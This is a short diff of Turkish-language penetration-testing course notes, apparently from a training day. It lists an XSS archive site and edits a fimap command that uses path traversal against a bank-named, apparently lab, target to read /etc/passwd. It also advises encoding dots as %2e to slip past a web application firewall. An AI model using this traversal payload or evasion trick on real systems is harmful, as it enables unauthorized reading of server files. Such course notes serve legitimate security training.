@@ -42,9 +42,9 @@ http://www.spoofcard.com/
 Gün 2 
 http://www.xssed.com/archive/special=1 xss açıklarını gösteren site
 
-fimap -u 'http:isube.bgabank.com/?sayfa=" /../../../../../../../../../etc/passwd
+fimap -u 'http:isube.bgabank.com/?sayfa="/../../../../../../../../../etc/passwd"
 
-. ları waf görmez bu yüzden  . yerine %2e koyarız 
+. ları waf görmez bu yüzden  . yerine %2e koyarız ve böylece dosya içerisine ulaşabiliriz 
 
 
 
